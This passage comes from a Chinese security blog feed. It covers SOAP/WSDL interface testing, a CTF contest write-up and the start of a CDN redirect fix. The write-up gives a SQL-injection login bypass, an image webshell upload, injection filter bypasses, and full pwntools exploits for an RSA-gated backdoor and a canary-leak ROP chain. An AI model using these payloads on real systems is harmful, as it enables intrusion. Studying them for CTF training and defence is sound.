class="hljs-string">"ns1:checkIdentity"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"checkIdentity"</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">wsdl:input</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">wsdl:output</span> <span class="hljs-attr">message</span>=<span class="hljs-string">"ns1:checkIdentityResponse"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"checkIdentityResponse"</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">wsdl:output</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">wsdl:operation</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">wsdl:portType</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">wsdl:definitions</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="definitions-元素"><a href="#definitions-元素" class="headerlink" title="definitions 元素"></a>definitions 元素</h3><p>这里不过多介绍，它是每个 WSDL 文档中的根元素，就用来提供命名空间的</p><h3 id="types-元素"><a href="#types-元素" class="headerlink" title="types 元素"></a>types 元素</h3><p>数据类型(标签)定义的容器，里面使用 schema 定义了一些标签结构供 message 引用<br><img src="https://raw.githubusercontent.com/0x7b/CDN/master/img/20210122211938.png#height=330&id=WaEJi&margin=%5Bobject%20Object%5D&name=&originHeight=330&originWidth=1855&originalType=binary&status=done&style=none&width=1855" srcset="/img/loading.gif" lazyload alt=""><br>上面是数据定义部分，该部分定义了两个元素，一个是 checkIdentity，一个是 checkIdentityResponse<br>       checkIdentity：定义了一个复杂类型，包含三个简单的字符串，将来用来描述操作的参数传入部分；<br>       checkIdentityResponse：定义了一个复杂类型，仅仅包含一个简单的字符串，将来用来描述操作的返回值；<br>        这里 checkIdentityResponse 是和 checkIdentity 相关的，checkIdentity 相对于一个方法，里面的 <code>name=&quot;arg0&quot; type=&quot;xs:string&quot;</code>是确定传入参数 arg 是 String 类型的，而 checkIdentityResponse 中的 <code>name=&quot;Return&quot; type=&quot;xs:string&quot;</code>是确定方法 checkIdentity（String name）的返回类型是 String 类型。</p><h3 id="message-元素"><a href="#message-元素" class="headerlink" title="message 元素"></a>message 元素</h3><p>通信消息的数据结构的抽象化类型定义。引用 types 中定义的标签<br><img src="https://raw.githubusercontent.com/0x7b/CDN/master/img/20210122212054.png#height=109&id=VqGMd&margin=%5Bobject%20Object%5D&name=&originHeight=109&originWidth=693&originalType=binary&status=done&style=none&width=693" srcset="/img/loading.gif" lazyload alt=""><br>该部分是消息格式的抽象定义：定义了两个消息 checkIdentityResponse 和 checkIdentity：<br>checkIdentity：checkIdentity 操作的请求消息格式，由一个消息片段组成，名字为 parameters，元素是我们前面定义的 types 中的元素；<br>checkIdentityResponse：checkIdentity 操作的响应消息格式，由一个消息片段组成，名字为 parameters，元素是我们前面定义的 types 中的元素；<br>　　如果采用 RPC 样式的消息传递，只需要将文档中的 element 元素修改为 type 即可。</p><h3 id="portType-元素"><a href="#portType-元素" class="headerlink" title="portType 元素"></a>portType 元素</h3><p>portType 元素定义了 Web 服务的抽象接口。该接口有点类似 Java 的接口，都是定义了一个抽象类型和方法，没有定义实现。在 WDSL 中，portType 元素是由 binding 和 service 元素来实现的，这两个元素用来说明 Web 服务实现使用的 Internet 协议、编码方案以及 Internet 地址。<br>一个 portType 中可以定义多个 operation，一个 operation 可以看作是一个方法，本文中 WSDL 文档的定义：<br><img src="https://raw.githubusercontent.com/0x7b/CDN/master/img/20210122212124.png#height=112&id=FLdCU&margin=%5Bobject%20Object%5D&name=&originHeight=112&originWidth=810&originalType=binary&status=done&style=none&width=810" srcset="/img/loading.gif" lazyload alt=""><br>portType 定义了服务调用模式的类型，这里包含一个 checkIdentity 方法，同时包含 input 和 output 表明该操作是一个请求/响应模式，请求消息是前面定义的 checkIdentity，响应消息是前面定义的 scheckIdentityResponse。input 表示传递到 Web 服务的有效负载，output 消息表示传递给客户的有效负载。</p><h3 id="binding-元素"><a href="#binding-元素" class="headerlink" title="binding 元素"></a>binding 元素</h3><p>binding 元素将一个抽象 portType 映射到一组具体协议（SOAP 和 HTTP）、消息传递样式、编码样式。通常 binding 元素与协议专有的元素合在一起使用，本文中的例子：<br><img src="https://raw.githubusercontent.com/0x7b/CDN/master/img/20210122212149.png#height=218&id=ltN7G&margin=%5Bobject%20Object%5D&name=&originHeight=218&originWidth=814&originalType=binary&status=done&style=none&width=814" srcset="/img/loading.gif" lazyload alt=""><br>binding 描述 Web Services 的通信协议。 <code>&lt;soap:binding/&gt;</code>描述使用 SOAP 协议，binding 还描述 Web Services 的方法、输入、输出。其描述了如何通过 SOAP/HTTP 来访问按照前面描述的访问入口点类型部署的访问入口。规定了在具体 SOAP 调用时，应当使用的 soapAction 是””。具体的使用需要参考特定协议定义的元素。</p><h3 id="service-元素"><a href="#service-元素" class="headerlink" title="service 元素"></a>service 元素</h3><p>service 元素包含一个或者多个 port 元素，其中每个 port 元素表示一个不同的 Web 服务。<br><img src="https://raw.githubusercontent.com/0x7b/CDN/master/img/20210122212221.png#height=94&id=IOn9E&margin=%5Bobject%20Object%5D&name=&originHeight=94&originWidth=887&originalType=binary&status=done&style=none&width=887" srcset="/img/loading.gif" lazyload alt=""><br>首先这里<code>service</code>标签描述了服务名称<code>CheckIdentityServiceImp1Service</code>,<code>port name</code>描述了可以支持 soap1.1 协议,然后提供了该服务的访问地址(EndPoint)。</p><h3 id="手工构造-SOAP-请求包"><a href="#手工构造-SOAP-请求包" class="headerlink" title="手工构造 SOAP 请求包"></a>手工构造 SOAP 请求包</h3><p>以 SOAP1.1 协议为例<br>PS：SOAP1.1 和 SOAP1.2 协议的区别移步<a href="https://www.cnblogs.com/yefengmeander/p/4176771.html" target="_blank" rel="noopener">https://www.cnblogs.com/yefengmeander/p/4176771.html</a><br>SOAP 协议请求的一般格式为</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/osms/services/checkIdentityService</span> HTTP/1.1<br><span class="hljs-attribute">Accept</span>: text/plain, */*; q=0.01<br><span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36<br><span class="hljs-attribute">X-Requested-With</span>: XMLHttpRequest<br><span class="hljs-attribute">Referer</span>: http://osms.xxx.com/osms/services/checkIdentityService?wsdl=CheckIdentityService.wsdl<br><span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span>: xxx=xxx<br><span class="hljs-attribute">Connection</span>: close<br><span class="hljs-attribute">SOAPAction:</span><br><span class="hljs-attribute">Content-Type</span>: text/xml;charset=UTF-8<br><span class="hljs-attribute">Host</span>: osms.xxx.com<br><span class="hljs-attribute">Content-Length</span>: 472<br><br>&lt;?xml version="1.0"?&gt;<br>&lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ser="http://server.order.services.wbs.osms.xx.com/"&gt;<br>&lt;soapenv:Header&gt;<br>...<br>&lt;/soapenv:Header&gt;<br>&lt;soapenv:Body&gt;<br>...<br>  &lt;soapenv:Fault&gt;<br>  ...<br>  &lt;/soapenv:Fault&gt;<br>&lt;/soapenv:Body&gt;<br>&lt;/soapenv:Envelope&gt;<br></code></pre></td></tr></table></figure><p>一般我们构造的请求包需要改变的就是 Envelope 和 Body 部分，Header 部分默认不变，Fault 部分可缺省。其中<code>&lt;soapenv:Envelope/&gt;</code>定义了使用的命名空间和编码格式，Body 部分包含请求正文是我们真正需要关注的。<br>如下图根据 types 元素中 complexType 输入参数的描述将对应值填入 body 部分即可<br><img src="https://raw.githubusercontent.com/0x7b/CDN/master/img/20210122212246.png#height=561&id=ZEaoV&margin=%5Bobject%20Object%5D&name=&originHeight=561&originWidth=1202&originalType=binary&status=done&style=none&width=1202" srcset="/img/loading.gif" lazyload alt=""></p><h1 id="挖掘过程简要记录"><a href="#挖掘过程简要记录" class="headerlink" title="挖掘过程简要记录"></a>挖掘过程简要记录</h1><p>首先拿到的是一个子域名 kbase.xxx.com<br>访问该域名，自动重定向到 main/login.jsp<br><img src="https://raw.githubusercontent.com/0x7b/CDN/master/img/20210122212306.png#height=79&id=Lvnpf&margin=%5Bobject%20Object%5D&name=&originHeight=79&originWidth=204&originalType=binary&status=done&style=none&width=204" srcset="/img/loading.gif" lazyload alt=""><br>直觉告诉我这个站有东西。首先看了下端口，JS 没什么可利用的东西，尝试扫目录<br><img src="https://raw.githubusercontent.com/0x7b/CDN/master/img/20210122133540.png#height=983&id=zPQSc&margin=%5Bobject%20Object%5D&name=&originHeight=983&originWidth=1893&originalType=binary&status=done&style=none&width=1893" srcset="/img/loading.gif" lazyload alt=""><br>找到了一个 Apache CXF 的 Server list<br>用 burp 的 Wsdler 自动化解析 WSDL 生成接口请求示例，然后手工测试 WebService。测试过程和平常的测试过程基本一致只不过换了一种数据格式传递 payload，在这里是以 XML 形式进行漏洞探测<br><img src="https://cdn.nlark.com/yuque/0/2021/png/8398873/1618541296351-6da66dc9-39ab-4cbd-9929-3acd864cfadc.png#clientId=ue63eaaff-1f31-4&from=paste&height=305&id=u2f77ffd9&margin=%5Bobject%20Object%5D&originHeight=399&originWidth=974&originalType=binary&size=139617&status=done&style=none&taskId=u1967e45f-4d1f-4fd5-b0bf-905af034e80&width=745" srcset="/img/loading.gif" lazyload alt=""><br>其实在 SOAP service 形式下存在的漏洞远不止这些，还可能存在任意文件读取、越权/未授权、远程代码执行、逻辑漏洞、注入漏洞、DOS 漏洞等具体要看后端 Web Method 的具体实现。<br>总结一下就是通过扫目录也可以是列目录漏洞等其他一些信息收集方法，找到一些接口，然后根据接口名定义和参数类型定义选择合适的攻击向量模糊测试。</p><h2 id="如何找到这些接口"><a href="#如何找到这些接口" class="headerlink" title="如何找到这些接口"></a>如何找到这些接口</h2><ol><li>搜索引擎搜索，包括但不限于 Google hacking、Fofa、Github 等</li><li>通过流量代理软件，正则匹配日志中有关接口的数据包</li><li>被动式扫描路径</li><li>其他有效信息收集手段</li></ol><h2 id="接口安全之我见"><a href="#接口安全之我见" class="headerlink" title="接口安全之我见"></a>接口安全之我见</h2><ol><li>对接口进行必要的身份验证，权限认证</li><li>严格控制用户输入</li><li>输出控制</li><li>接口访问限制</li><li>按照安全规范开发接口</li></ol><p>Reference<br><a href="https://www.cnblogs.com/susanhonly/p/11929195.html" target="_blank" rel="noopener">https://www.cnblogs.com/susanhonly/p/11929195.html</a><br><a href="https://xz.aliyun.com/t/7541" target="_blank" rel="noopener">https://xz.aliyun.com/t/7541</a><br><a href="https://www.anquanke.com/post/id/85910" target="_blank" rel="noopener">https://www.anquanke.com/post/id/85910</a><br><a href="https://www.cnblogs.com/zhaozhan/archive/2010/11/03/1868556.html" target="_blank" rel="noopener">https://www.cnblogs.com/zhaozhan/archive/2010/11/03/1868556.html</a></p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WebService</tag>
      
      <tag>接口安全</tag>
      
      <tag>CXF Server list</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Writeup for 13届国赛</title>
    <link href="/posts/1004/"/>
    <url>/posts/1004/</url>
    
    <content type="html"><![CDATA[<h3 id="Web-urbeautiful"><a href="#Web-urbeautiful" class="headerlink" title="Web_urbeautiful"></a>Web_urbeautiful</h3><p>这个题真的是一波三折，花了好长时间。万幸的是有队友细心且给力，最后终于是拿下了。这么费力的题一定要记录一下对吧。首先看题目入口，看看描述（没用）<br><img src="https://raw.githubusercontent.com/0x7b/CDN/master/img/20210124195002.jpg#align=left&display=inline&height=325&margin=%5Bobject%20Object%5D&originHeight=325&originWidth=692&status=done&style=none&width=692" srcset="/img/loading.gif" lazyload alt=""><br>靶机只有一个登录入口，fuzz 之后发现存在万能密码<br><img src="https://raw.githubusercontent.com/0x7b/CDN/master/img/20210124195003.jpg#align=left&display=inline&height=345&margin=%5Bobject%20Object%5D&originHeight=345&originWidth=692&status=done&style=none&width=692" srcset="/img/loading.gif" lazyload alt=""><br>用户名： <code>&#39;-&#39;&#39;#</code> 密码任意<br>登录后台，存在上传点，上传正常图片抓包发现没有数据包产生<br>F12 打开控制台查看网络发现使用 websocket 传输<br><img src="https://raw.githubusercontent.com/0x7b/CDN/master/img/20210124195004.jpg#align=left&display=inline&height=355&margin=%5Bobject%20Object%5D&originHeight=355&originWidth=691&status=done&style=none&width=691" srcset="/img/loading.gif" lazyload alt=""><br>此处用的是@skyxiaoyu 大佬的 WebSocket 测试工具，感谢大佬<br>使用 <code>set action</code>  上传文件<br><code>./</code>  绕过后缀名检查，上传 php 脚本文件但不解析。猜测服务端检测了文件内容是否为图片格式，于是将 phpinfo 语句写到图片里上传验证<br><img src="https://raw.githubusercontent.com/0x7b/CDN/master/img/20210124195005.png#align=left&display=inline&height=371&margin=%5Bobject%20Object%5D&originHeight=371&originWidth=691&status=done&style=none&width=691" srcset="/img/loading.gif" lazyload alt=""><br>如上图，phpinfo 在正常图片里可以被解析。思路得到证实，于是制作图片马上传<br><img src="https://raw.githubusercontent.com/0x7b/CDN/master/img/20210124195006.jpg#align=left&display=inline&height=339&margin=%5Bobject%20Object%5D&originHeight=339&originWidth=692&status=done&style=none&width=692" srcset="/img/loading.gif" lazyload alt=""><br>Hackbar 连接图片马，接下来就是找 flag 了<br><img src="https://raw.githubusercontent.com/0x7b/CDN/master/img/20210124195007.png#align=left&display=inline&height=371&margin=%5Bobject%20Object%5D&originHeight=371&originWidth=691&status=done&style=none&width=691" srcset="/img/loading.gif" lazyload alt=""><br>flag{5cdbd30292]</p><h3 id="Web-basqli"><a href="#Web-basqli" class="headerlink" title="Web_basqli"></a>Web_basqli</h3><p><img src="https://raw.githubusercontent.com/0x7b/CDN/master/img/20210124213341.jpg#align=left&display=inline&height=325&margin=%5Bobject%20Object%5D&originHeight=325&originWidth=661&status=done&style=none&width=661" srcset="/img/loading.gif" lazyload alt=""><br>首页 IP ERROR ! ONLY LOCALHOST !<br><img src="https://raw.githubusercontent.com/0x7b/CDN/master/img/20210124213724.jpg#align=left&display=inline&height=371&margin=%5Bobject%20Object%5D&originHeight=371&originWidth=691&status=done&style=none&width=691" srcset="/img/loading.gif" lazyload alt=""><br>加 XFF 头 127.0.0.1<br>Fuzz<br><img src="https://raw.githubusercontent.com/0x7b/CDN/master/img/20210124213736.png#align=left&display=inline&height=678&margin=%5Bobject%20Object%5D&originHeight=678&originWidth=692&status=done&style=none&width=692" srcset="/img/loading.gif" lazyload alt=""><br>Username 处宽字节注入<br>过滤 and，union select 等。用 or 和内敛注释绕过，得 flag 的表名<br><img src="https://raw.githubusercontent.com/0x7b/CDN/master/img/20210124213750.jpg#align=left&display=inline&height=561&margin=%5Bobject%20Object%5D&originHeight=561&originWidth=692&status=done&style=none&width=692" srcset="/img/loading.gif" lazyload alt=""><br>报错注入出 flag<br><img src="https://raw.githubusercontent.com/0x7b/CDN/master/img/20210124213852.jpg#align=left&display=inline&height=561&margin=%5Bobject%20Object%5D&originHeight=561&originWidth=692&status=done&style=none&width=692" srcset="/img/loading.gif" lazyload alt=""><br>flag{99f2384dc8}</p><h3 id="Web-noclass"><a href="#Web-noclass" class="headerlink" title="Web_noclass"></a>Web_noclass</h3><p><img src="https://raw.githubusercontent.com/0x7b/CDN/master/img/20210124213905.jpg#align=left&display=inline&height=355&margin=%5Bobject%20Object%5D&originHeight=355&originWidth=468&status=done&style=none&width=468" srcset="/img/loading.gif" lazyload alt=""><br>用原生类 stdClass，传入一个引入$c得变量$input,即可绕过 if 处得判断，因为引用是将指针指向原变量地址，所存储得值也一样，所以可以成功获取 flag<br><img src="https://raw.githubusercontent.com/0x7b/CDN/master/img/20210124213912.jpg#align=left&display=inline&height=313&margin=%5Bobject%20Object%5D&originHeight=313&originWidth=692&status=done&style=none&width=692" srcset="/img/loading.gif" lazyload alt=""></p><p><img src="https://raw.githubusercontent.com/0x7b/CDN/master/img/20210124213924.jpg#align=left&display=inline&height=269&margin=%5Bobject%20Object%5D&originHeight=269&originWidth=692&status=done&style=none&width=692" srcset="/img/loading.gif" lazyload alt=""></p><h3 id="Pwn-gamaover"><a href="#Pwn-gamaover" class="headerlink" title="Pwn-gamaover"></a>Pwn-gamaover</h3><p>首先用 ida 打开程序 可以看出是个 c++程序 经过浏览之后 我们可以看出是在三个跳出三个 while 循环就可以到达后门函数<br><img src="https://raw.githubusercontent.com/0x7b/CDN/master/img/20210124221130.jpg#align=left&display=inline&height=431&margin=%5Bobject%20Object%5D&originHeight=431&originWidth=692&status=done&style=none&width=692" srcset="/img/loading.gif" lazyload alt=""></p><p><img src="https://raw.githubusercontent.com/0x7b/CDN/master/img/20210124221145.jpg#align=left&display=inline&height=359&margin=%5Bobject%20Object%5D&originHeight=359&originWidth=692&status=done&style=none&width=692" srcset="/img/loading.gif" lazyload alt=""><br>输入 1 就会进入然后进行下列函数 不是 1 会跳出第一层循环<br><img src="https://raw.githubusercontent.com/0x7b/CDN/master/img/20210124221155.jpg#align=left&display=inline&height=230&margin=%5Bobject%20Object%5D&originHeight=230&originWidth=692&status=done&style=none&width=692" srcset="/img/loading.gif" lazyload alt=""><br>输入 2 会进行 scanf 函数输入<br><img src="https://raw.githubusercontent.com/0x7b/CDN/master/img/20210124221203.jpg#align=left&display=inline&height=238&margin=%5Bobject%20Object%5D&originHeight=238&originWidth=531&status=done&style=none&width=531" srcset="/img/loading.gif" lazyload alt=""><br>在这里发现当第一次输入的是 7 时可以跳出第二层 while 循环，然后进行比较 v17 和 v18 的值 如果相等就跳出第三层循环然后执行后门函数，V18 是我们输入的 v17 是系统的，查看 v17 可以发现在这些地方出现<br><img src="https://raw.githubusercontent.com/0x7b/CDN/master/img/20210124221339.jpg#align=left&display=inline&height=442&margin=%5Bobject%20Object%5D&originHeight=442&originWidth=693&status=done&style=none&width=693" srcset="/img/loading.gif" lazyload alt=""><br>进入 sub_FCA 函数可以看到 v17 怎么得来的<br><img src="https://raw.githubusercontent.com/0x7b/CDN/master/img/20210124221357.jpg#align=left&display=inline&height=363&margin=%5Bobject%20Object%5D&originHeight=363&originWidth=692&status=done&style=none&width=692" srcset="/img/loading.gif" lazyload alt=""><br>然后经过转换得到 v17 所以我们只要得到这个输入即可，而我们的 v17 主要通过给出的大数得来 然后进行 RSA 解密，解密之前需要先得到其他两个值 通过输入 1 然后得到其他两个值，输入 2 即可 scanf 其中输入的值位于.bss 段，通过 RSA 解密 赋值给 V17 输入即可相等跳转到后门函数<br>编写出 exp 如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> gmpy2<br><br>\<span class="hljs-comment">#p=remote("172.1.26.12",9999)</span><br><br>p=process(<span class="hljs-string">'./gameover'</span>)<br><br>M=int(<span class="hljs-string">"67a737395fc8953d729633be3f37ba438da756fd02c74fd9e93afb26c2e21c1fc27e5df670fd92d21cdc2a895072f9c39a688cb30f32902a77268bd2fb60e79d7edc130ddf608c173d1bfe8cc3b9e6a3103bc45f64c69b65bb5830c038fedcc326e3b6ecd2adc5686b19177e64a78dc96c8a1b052a0058dad59ad134c79c729f"</span>,<span class="hljs-number">16</span>)<br><br>p.recvuntil(<span class="hljs-string">'option:'</span>)<br>p.sendline(<span class="hljs-string">'2'</span>)<br>p.recvuntil(<span class="hljs-string">'message:'</span>)<br>p.sendline(<span class="hljs-string">'a'</span>*<span class="hljs-number">0x20</span>+p64(<span class="hljs-number">17</span>))<br><br>p.sendlineafter(<span class="hljs-string">'option:'</span>,<span class="hljs-string">'1'</span>)<br>p.recvuntil(<span class="hljs-string">'ciphertext:'</span>)<br>A=int(p.recv(<span class="hljs-number">256</span>),<span class="hljs-number">16</span>)<br><br>p.recvuntil(<span class="hljs-string">'option:'</span>)<br>p.sendline(<span class="hljs-string">'2'</span>)<br>p.recvuntil(<span class="hljs-string">'message:'</span>)<br>p.sendline(<span class="hljs-string">'a'</span>*<span class="hljs-number">0x20</span>+p64(<span class="hljs-number">18</span>))<br><br>p.sendlineafter(<span class="hljs-string">"option:"</span>,<span class="hljs-string">'1'</span>)<br>p.recvuntil(<span class="hljs-string">'ciphertext:'</span>)<br>B=int(p.recv(<span class="hljs-number">256</span>),<span class="hljs-number">16</span>)<br>R=(B*gmpy2.invert(A,M))%M<br><br>p.sendlineafter(<span class="hljs-string">'option:'</span>,<span class="hljs-string">'7'</span>)<br>p.sendline(hex(R)[<span class="hljs-number">2</span>:])<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="Pwn-easystackrop"><a href="#Pwn-easystackrop" class="headerlink" title="Pwn_easystackrop"></a>Pwn_easystackrop</h3><p>首先查看一下防护：<br><img src="https://raw.githubusercontent.com/0x7b/CDN/master/img/20210124221414.jpg#align=left&display=inline&height=301&margin=%5Bobject%20Object%5D&originHeight=301&originWidth=692&status=done&style=none&width=692" srcset="/img/loading.gif" lazyload alt=""><br>开启了 nx 和 canary 防护<br><img src="https://raw.githubusercontent.com/0x7b/CDN/master/img/20210124221442.jpg#align=left&display=inline&height=381&margin=%5Bobject%20Object%5D&originHeight=381&originWidth=692&status=done&style=none&width=692" srcset="/img/loading.gif" lazyload alt=""><br>这里有格式化字符串漏洞 我们可以利用来绕过 canary<br>64 位的 canary 机制,会在函数头部添加:</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">mov</span>  <span class="hljs-built_in">rax</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> <span class="hljs-built_in">fs</span>:<span class="hljs-number">0x28</span>        //从<span class="hljs-built_in">fs</span>:<span class="hljs-number">0x28</span>寄存器中取一个值<br><span class="hljs-keyword">mov</span>  <span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x8</span>],<span class="hljs-built_in">rax</span>       //写入当前栈帧底部(<span class="hljs-built_in">RBP</span>前方第一个数)<br></code></pre></td></tr></table></figure><p>结尾部分添加:</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">mov</span>  <span class="hljs-built_in">rcx</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x8</span>]       //把金丝雀值取出<br><span class="hljs-keyword">xor</span>  <span class="hljs-built_in">rcx</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> <span class="hljs-built_in">fs</span>:<span class="hljs-number">0x28</span>        //比较与寄存器中的是否一样<br><span class="hljs-keyword">je</span>   xxxxx                //函数正常退出<br><span class="hljs-keyword">call</span>  <span class="hljs-number">0x400580</span> &lt;__stack_chk_fail@plt&gt;   //__stack_chk_fail()函数功能为报告栈损坏<br></code></pre></td></tr></table></figure><p>canary 的值一般是 rbp-8 的位置，有时候会在 rbp 到 rsp 之间，并且以 0x00 结尾<br>然后我们利用格式化字符串泄露 canary 的值，从 ctfwiki 上有介绍可以利用%15$p 打印<br>接下里是 nx 绕过<br>我们可以在下面的 vnlner 函数绕过<br><img src="https://raw.githubusercontent.com/0x7b/CDN/master/img/20210124221657.jpg#align=left&display=inline&height=289&margin=%5Bobject%20Object%5D&originHeight=289&originWidth=693&status=done&style=none&width=693" srcset="/img/loading.gif" lazyload alt=""><br>现在需要构造后门函数 题目给了里 libc.so 文件 用来泄露 libc 的基址 利用 onegadget 工具得到基址即可<br><img src="https://raw.githubusercontent.com/0x7b/CDN/master/img/20210124221708.jpg#align=left&display=inline&height=310&margin=%5Bobject%20Object%5D&originHeight=310&originWidth=692&status=done&style=none&width=692" srcset="/img/loading.gif" lazyload alt=""><br>编写的 exp 如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = process(<span class="hljs-string">'./pwn'</span>)<br>\<span class="hljs-comment">#p = remote('172.1.26.13','9999')</span><br>elf = ELF(<span class="hljs-string">"./pwn"</span>)<br><br>libc = ELF(<span class="hljs-string">"libc-2.23.so"</span>)<br><br>rdi_addr = <span class="hljs-number">0x400903</span><br>vuln_addr = <span class="hljs-number">0x400786</span><br>got_addr = elf.got[<span class="hljs-string">'read'</span>]<br>plt_addr = elf.plt[<span class="hljs-string">'puts'</span>]<br>offset = <span class="hljs-string">'%15$p'</span><br>gadget_addr = <span class="hljs-number">0x45226</span><br>p.recvline(<span class="hljs-string">'hello:'</span>)<br>p.sendline(offset)<br>canary = int(p.recv(<span class="hljs-number">18</span>),<span class="hljs-number">16</span>)<br><br>p.recv()<br>payload = <span class="hljs-string">'a'</span>*<span class="hljs-number">0x38</span> + p64(canary) + <span class="hljs-string">'a'</span>*<span class="hljs-number">8</span> + p64(rdi_addr) + p64(got_addr)+p64(plt_addr)+p64(vuln_addr)<br>p.sendline(payload)<br><br>read_addr=u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">'\x00'</span>))<br>libc_base = read_addr - libc.symbols[<span class="hljs-string">"read"</span>]<br>execv_addr = libc_base+gadget_addr<br><br>payload = <span class="hljs-string">'a'</span>*<span class="hljs-number">0x38</span> + p64(canary) + <span class="hljs-string">'a'</span>*<span class="hljs-number">8</span> + p64(execv_addr)<br>p.sendline(payload)<br>p.recv()<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Writeup</tag>
      
      <tag>国赛</tag>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CDN下访问源站ERR_TOO_MANY_REDIRECTS</title>
    <link href="/posts/1002/"/>
    <url>/posts/1002/</url>
    
    <content type="html"><![CDATA[<h1 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h1><p>源站（GitHub pages）使用了 CDN，浏览器访问提示重定向过多</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">XXX</span><span class="hljs-selector-class">.XXX</span><span class="hljs-selector-class">.XXX</span> 将您重定向的次数过多。<br>尝试清除 <span class="hljs-selector-tag">Cookie</span>.<br><span class="hljs-selector-tag">ERR_TOO_MANY_REDIRECTS</span><br></code></pre></td></tr></table></figure><h1 id="问题原因"><a href="#问题原因" class="headerlink" title="问题原因"></a>问题原因</h1><p>Github Pages 开启了 Enforce HTTPS，且 CDN 中回源协议为 HTTP。此时客户端无论通过哪种协议访问源站的 CDN 加速域名，CDN 都会以 HTTP 协议回源。而源站因为 Enforce HTTPS 的存在返回 301 永久重定向强制要求 CDN 重新以 HTTPS 访问，但 CDN 下次依旧会发送 HTTP 请求。以此往复，就会出现以下情况<br><img src="https://cdn.jsdelivr.net/gh/0x7b/CDN/img/20201224161640.png" srcset="/img/loading.gif" lazyload alt="image"></p><h1 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h1><ul><li>关闭源站强制 HTTPS 跳转功能</li><li>在 CDN 管理控制台配置回源协议为 HTTPS，或协议跟随（腾讯云，其他 